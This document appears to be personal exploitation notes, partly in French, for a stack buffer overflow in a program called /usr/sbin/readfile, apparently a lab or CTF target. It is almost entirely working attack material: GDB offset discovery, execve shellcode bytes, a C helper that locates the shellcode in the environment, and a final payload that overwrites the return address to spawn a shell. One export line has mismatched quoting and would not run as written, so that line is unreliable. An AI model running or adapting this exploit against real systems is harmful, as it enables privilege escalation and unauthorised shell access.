
# GDB

```
checksec
pattern_create 100
r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
pattern_search
#[RSP] --> offset 88 - size ~12
r $(python2 -c 'print "A"*88+"B"*8')
#http://shell-storm.org/shellcode/files/shellcode-806.html
#\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05
r $(python2 -c 'print "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "A"*(88-27) + "B"*6')
```

Trouver addresse shellcode

```
export SHELLCODE='python2 -c 'print "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"''
```

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
    char *ptr;

    if(argc < 3) {
        printf("Usage: %s <environment variable> <target program name>\n", argv[0]);
        exit(0);
    }

    ptr = getenv(argv[1]);
    if (ptr == NULL) {
        printf("Environment variable not found\n");
        exit(1);
    }

    ptr += (strlen(argv[0]) - strlen(argv[2])) * 2;
    printf("%s will be at %p\n", argv[1], (void *)ptr);
    return 0;
}
```

```
gcc getenv.c -o getenv 
chmod +x getenv
./getenv SHELLCODE /usr/sbin/readfile
/usr/sbin/readfile $(python2 -c 'print "A"*88+"\x52\xe7\xff\xff\xff\x7f"')
```